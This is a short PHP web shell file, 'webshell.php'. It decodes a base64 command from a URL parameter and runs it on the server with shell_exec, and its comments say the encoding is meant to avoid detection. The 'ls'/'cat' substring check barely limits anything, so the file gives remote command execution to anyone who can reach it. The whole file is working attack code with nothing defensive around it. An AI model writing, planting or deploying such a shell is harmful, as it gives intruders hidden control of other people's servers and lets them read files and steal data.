<?php
// webshell.php

if (isset($_GET['cmd'])) {
    // Obfuscate command execution to avoid detection
    $cmd = base64_decode($_GET['cmd']); // Base64 encoding to hide the command
    if (strpos($cmd, "ls") !== false || strpos($cmd, "cat") !== false) {
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    } else {
        echo "Invalid command!";
    }
}
?>
